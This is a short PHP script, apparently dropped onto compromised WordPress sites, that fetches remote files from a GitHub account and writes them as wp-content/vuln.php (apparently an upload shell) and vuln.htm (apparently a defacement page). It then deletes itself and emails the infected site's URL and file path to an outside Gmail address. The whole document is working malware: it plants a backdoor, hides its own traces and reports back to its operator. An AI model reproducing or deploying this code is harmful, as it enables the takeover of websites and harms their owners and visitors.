<head><title>Vuln!! patch it Now!</title></head>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/up.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
$site = "";
if(!ereg($site, $_SERVER['SERVER_NAME']))
{
    $to = "kalix0xalik@gmail.com";
    $subject = "FRESH MAILLERS";
    $header = "from: BoT <adredf151@webmail.com>";
    $message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "
";
    $message .= "Path : " . __file__;
    $sentmail = @mail($to, $subject, $message, $header);
    
    echo "";
    exit;
}
?>